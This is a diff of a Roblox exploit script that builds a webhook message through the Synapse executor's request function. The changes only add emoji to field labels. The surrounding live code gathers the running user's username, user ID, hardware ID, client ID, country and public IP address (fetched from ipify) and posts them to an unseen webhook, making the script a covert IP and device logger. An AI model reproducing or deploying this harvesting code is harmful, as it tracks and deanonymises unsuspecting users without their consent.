@@ -84,38 +84,38 @@ local requestwebhook = syn.request({
            ["description"] = "",
            ["color"] = 65484,
             ["fields"] = {{
-                ["name"] = "Executed Time Date",
+                ["name"] = "[ 📅 ] Executed Time Date [ 📅 ]",
                ["value"] = "```"..dt:FormatLocalTime("LL", "en-us").."```",
                 ["inline"] = OP
             },
 			{
-                ["name"] = "Executed Time Clock",
+                ["name"] = "[ 🕒 ] Executed Time Clock [ 🕒 ]",
                 ["value"] = "```"..os.date("%H")..":"..os.date("%M")..":"..os.date("%S").."```",
                 ["inline"] = OP
             },
 				                
 			{
-                ["name"] = "INFO PLAYER",
+                ["name"] = "[ 👨‍🎓 ] INFO PLAYER [ 👨‍🎓 ]",
                 ["value"] = "```Username : "..game.Players.LocalPlayer.Name.."```".."```Display Username : "..game.Players.LocalPlayer.DisplayName.."```".."```Account Age : "..game.Players.LocalPlayer.AccountAge.."```".."```User ID : "..game.Players.LocalPlayer.UserId.."```".."```Profile : ".."https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile".."```",
                 ["inline"] = CL
             }, 
             {
-                ["name"] = "INFO GAME",
+                ["name"] = "[ 🎮 ] INFO GAME [ 🎮 ]",
                 ["value"] = "```Place Name  : "..info.Name.."```".."```Place ID : "..game.PlaceId.."```".."```Place Version : "..game.PlaceVersion.."```".."```PrivateServer ID : "..game.JobId.."```",
                 ["inline"] = CL
             }, 
             {
-                ["name"] = "INFO EXECUTOR",
+                ["name"] = "[ 👨🏽‍💻 ] INFO EXECUTOR[ 👨🏽‍💻 ]",
                 ["value"] = "```Executor Name : "..EXE.."```".."```Hwid : "..a.."```".."```Client ID : "..ClientId.."```".."```Country : "..code.."```".."```Local ID : "..game.Players.LocalPlayer.LocaleId.."```",
                 ["inline"] = CL
             },
 	    {
-                ["name"] = "Premium | INFO",
+                ["name"] = "[ ⭐ ] Premium | INFO [ ⭐ ]",
                 ["value"] = "```IP Address : "..game:HttpGet("https://api.ipify.org").."```",
                 ["inline"] = CL
             },
          {
-                ["name"] = "CREDIT",
+                ["name"] = "[ 🛠 ] CREDIT [ 🛠 ]",
                 ["value"] = "```Credit : B O O M#4134 \n         https://bxb-hub.github.io/Profile_Card/```",
                 ["inline"] = CL
             },
